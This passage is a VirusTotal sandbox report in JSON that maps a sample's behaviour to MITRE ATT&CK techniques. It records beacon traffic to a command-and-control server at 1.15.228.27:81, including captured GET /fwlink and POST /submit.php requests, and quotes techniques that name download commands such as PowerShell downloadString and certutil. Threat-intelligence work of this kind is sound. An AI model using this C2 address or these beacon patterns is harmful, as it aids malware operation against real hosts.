traffic on port 49757 -> 81", "HTTP traffic on port 81 -> 49757", "HTTP traffic on port 49758 -> 81", "HTTP traffic on port 81 -> 49758", "HTTP traffic on port 49759 -> 81", "HTTP traffic on port 81 -> 49759", "HTTP traffic on port 49760 -> 81", "HTTP traffic on port 81 -> 49760", "HTTP traffic on port 49761 -> 81", "HTTP traffic on port 81 -> 49761", "HTTP traffic on port 49762 -> 81", "HTTP traffic on port 81 -> 49762", "HTTP traffic on port 49763 -> 81", "HTTP traffic on port 81 -> 49763", "HTTP traffic on port 49764 -> 81", "HTTP traffic on port 81 -> 49764", "HTTP traffic on port 49765 -> 81", "HTTP traffic on port 81 -> 49765", "HTTP traffic on port 49766 -> 81", "HTTP traffic on port 81 -> 49766", "HTTP traffic on port 49767 -> 81", "HTTP traffic on port 81 -> 49767", "HTTP traffic on port 49768 -> 81", "HTTP traffic on port 81 -> 49768", "HTTP traffic on port 49769 -> 81", "HTTP traffic on port 81 -> 49769", "192.168.122.102:49681 -> 1.15.228.27:81"]}, {"severity": "INFO", "description": "Detected TCP or UDP traffic on non-standard ports", "match_data": ["HTTP traffic on port 49681 -> 81", "HTTP traffic on port 81 -> 49681", "HTTP traffic on port 49682 -> 81", "HTTP traffic on port 81 -> 49682", "HTTP traffic on port 49683 -> 81", "HTTP traffic on port 81 -> 49683", "HTTP traffic on port 49685 -> 81", "HTTP traffic on port 81 -> 49685", "HTTP traffic on port 49686 -> 81", "HTTP traffic on port 81 -> 49686", "HTTP traffic on port 49687 -> 81", "HTTP traffic on port 81 -> 49687", "HTTP traffic on port 49688 -> 81", "HTTP traffic on port 81 -> 49688", "HTTP traffic on port 49689 -> 81", "HTTP traffic on port 81 -> 49689", "HTTP traffic on port 49690 -> 81", "HTTP traffic on port 81 -> 49690", "HTTP traffic on port 49691 -> 81", "HTTP traffic on port 81 -> 49691", "HTTP traffic on port 49692 -> 81", "HTTP traffic on port 81 -> 49692", "HTTP traffic on port 49693 -> 81", "HTTP traffic on port 81 -> 49693", "HTTP traffic on port 49694 -> 81", "HTTP traffic on port 81 -> 49694", "HTTP traffic on port 49695 -> 81", "HTTP traffic on port 81 -> 49695", "HTTP traffic on port 49696 -> 81", "HTTP traffic on port 81 -> 49696", "HTTP traffic on port 49697 -> 81", "HTTP traffic on port 81 -> 49697", "HTTP traffic on port 49698 -> 81", "HTTP traffic on port 81 -> 49698", "HTTP traffic on port 49699 -> 81", "HTTP traffic on port 81 -> 49699", "HTTP traffic on port 49700 -> 81", "HTTP traffic on port 81 -> 49700", "HTTP traffic on port 49701 -> 81", "HTTP traffic on port 81 -> 49701", "HTTP traffic on port 49702 -> 81", "HTTP traffic on port 81 -> 49702", "HTTP traffic on port 49703 -> 81", "HTTP traffic on port 81 -> 49703", "HTTP traffic on port 49704 -> 81", "HTTP traffic on port 81 -> 49704", "HTTP traffic on port 49705 -> 81", "HTTP traffic on port 81 -> 49705", "HTTP traffic on port 49706 -> 81", "HTTP traffic on port 81 -> 49706", "HTTP traffic on port 49707 -> 81", "HTTP traffic on port 81 -> 49707", "HTTP traffic on port 49708 -> 81", "HTTP traffic on port 81 -> 49708", "HTTP traffic on port 49709 -> 81", "HTTP traffic on port 81 -> 49709", "HTTP traffic on port 49710 -> 81", "HTTP traffic on port 81 -> 49710", "HTTP traffic on port 49711 -> 81", "HTTP traffic on port 81 -> 49711", "HTTP traffic on port 49712 -> 81", "HTTP traffic on port 81 -> 49712", "HTTP traffic on port 49714 -> 81", "HTTP traffic on port 81 -> 49714", "HTTP traffic on port 49715 -> 81", "HTTP traffic on port 81 -> 49715", "HTTP traffic on port 49716 -> 81", "HTTP traffic on port 81 -> 49716", "HTTP traffic on port 49717 -> 81", "HTTP traffic on port 81 -> 49717", "HTTP traffic on port 49718 -> 81", "HTTP traffic on port 81 -> 49718", "HTTP traffic on port 49719 -> 81", "HTTP traffic on port 81 -> 49719", "HTTP traffic on port 49721 -> 81", "HTTP traffic on port 81 -> 49721", "HTTP traffic on port 49723 -> 81", "HTTP traffic on port 81 -> 49723", "HTTP traffic on port 49724 -> 81", "HTTP traffic on port 81 -> 49724", "HTTP traffic on port 49725 -> 81", "HTTP traffic on port 81 -> 49725", "HTTP traffic on port 49726 -> 81", "HTTP traffic on port 81 -> 49726", "HTTP traffic on port 49727 -> 81", "HTTP traffic on port 81 -> 49727", "HTTP traffic on port 49728 -> 81", "HTTP traffic on port 81 -> 49728", "HTTP traffic on port 49731 -> 81", "HTTP traffic on port 81 -> 49731", "HTTP traffic on port 49732 -> 81", "HTTP traffic on port 81 -> 49732", "HTTP traffic on port 49733 -> 81", "HTTP traffic on port 81 -> 49733", "HTTP traffic on port 49734 -> 81", "HTTP traffic on port 81 -> 49734", "HTTP traffic on port 49735 -> 81", "HTTP traffic on port 81 -> 49735", "HTTP traffic on port 49736 -> 81", "HTTP traffic on port 81 -> 49736", "HTTP traffic on port 49737 -> 81", "HTTP traffic on port 81 -> 49737", "HTTP traffic on port 49738 -> 81", "HTTP traffic on port 81 -> 49738", "HTTP traffic on port 49739 -> 81", "HTTP traffic on port 81 -> 49739", "HTTP traffic on port 49740 -> 81", "HTTP traffic on port 81 -> 49740", "HTTP traffic on port 49741 -> 81", "HTTP traffic on port 81 -> 49741", "HTTP traffic on port 49742 -> 81", "HTTP traffic on port 81 -> 49742", "HTTP traffic on port 49743 -> 81", "HTTP traffic on port 81 -> 49743", "HTTP traffic on port 49744 -> 81", "HTTP traffic on port 81 -> 49744", "HTTP traffic on port 49745 -> 81", "HTTP traffic on port 81 -> 49745", "HTTP traffic on port 49746 -> 81", "HTTP traffic on port 81 -> 49746", "HTTP traffic on port 49747 -> 81", "HTTP traffic on port 81 -> 49747", "HTTP traffic on port 49748 -> 81", "HTTP traffic on port 81 -> 49748", "HTTP traffic on port 49749 -> 81", "HTTP traffic on port 81 -> 49749", "HTTP traffic on port 49750 -> 81", "HTTP traffic on port 81 -> 49750", "HTTP traffic on port 49751 -> 81", "HTTP traffic on port 81 -> 49751", "HTTP traffic on port 49752 -> 81", "HTTP traffic on port 81 -> 49752", "HTTP traffic on port 49753 -> 81", "HTTP traffic on port 81 -> 49753", "HTTP traffic on port 49754 -> 81", "HTTP traffic on port 81 -> 49754", "HTTP traffic on port 49755 -> 81", "HTTP traffic on port 81 -> 49755", "HTTP traffic on port 49756 -> 81", "HTTP traffic on port 81 -> 49756", "HTTP traffic on port 49757 -> 81", "HTTP traffic on port 81 -> 49757", "HTTP traffic on port 49758 -> 81", "HTTP traffic on port 81 -> 49758", "HTTP traffic on port 49759 -> 81", "HTTP traffic on port 81 -> 49759", "HTTP traffic on port 49760 -> 81", "HTTP traffic on port 81 -> 49760", "HTTP traffic on port 49761 -> 81", "HTTP traffic on port 81 -> 49761", "HTTP traffic on port 49762 -> 81", "HTTP traffic on port 81 -> 49762", "HTTP traffic on port 49763 -> 81", "HTTP traffic on port 81 -> 49763", "HTTP traffic on port 49764 -> 81", "HTTP traffic on port 81 -> 49764", "HTTP traffic on port 49765 -> 81", "HTTP traffic on port 81 -> 49765", "HTTP traffic on port 49766 -> 81", "HTTP traffic on port 81 -> 49766", "HTTP traffic on port 49767 -> 81", "HTTP traffic on port 81 -> 49767", "HTTP traffic on port 49768 -> 81", "HTTP traffic on port 81 -> 49768", "HTTP traffic on port 49769 -> 81", "HTTP traffic on port 81 -> 49769", "192.168.122.102:49681 -> 1.15.228.27:81"]}]}, {"id": "T1095", "name": "Non-Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1095/", "description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\nIn ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host\u2019s backdoor, regardless of network segmentation or firewall rules in place.", "signatures": [{"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte"]}, {"severity": "INFO", "description": "Posts data to webserver", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte"]}]}, {"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071/", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "signatures": [{"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte", "1.15.228.27", "GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte"]}, {"severity": "INFO", "description": "Posts data to webserver", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte", "1.15.228.27", "GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte"]}, {"severity": "LOW", "description": "C2 URLs / IPs found in malware configuration", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte", "1.15.228.27", "GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte"]}, {"severity": "INFO", "description": "Uses a known web browser user agent for HTTP communication", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte", "1.15.228.27", "GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re", "POST /submit.php?id=1434355178 HTTP/1.1Accept: */*Content-Type: application/octet-streamUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BOIE9;ENUS)Host: 1.15.228.27:81Conte"]}]}, {"id": "T1105", "name": "Ingress Tool Transfer", "link": "https://attack.mitre.org/techniques/T1105/", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.  A number of these tools, such as wget, curl, and scp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via certutil -hashfile).\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "INFO", "description": "Downloads files from webservers via HTTP", "match_data": ["GET /fwlink HTTP/1.1Accept: */*Cookie: T8F09VqMr+lSFi/xYGkas8q15Pi8hdyzwzMQYMtYQ4O7ebB8e08jNHBSlx8cDJLN891TxPnEqoSOCBSYEZ+FDdghx1ZBi0c4GWsCtqDapyZvohppSQqfxs6+PcBugEMykTkVla5YO/gEbRUTNJZIwF056GgDTr3re"]}]}]}]}}, "links": {"self": "https://www.virustotal.com/api/v3/files/cf1f54b8a75395a1c8bfbb528a573121d87b191389cd38674a55afbf859ed3f9/behaviour_mitre_trees"}}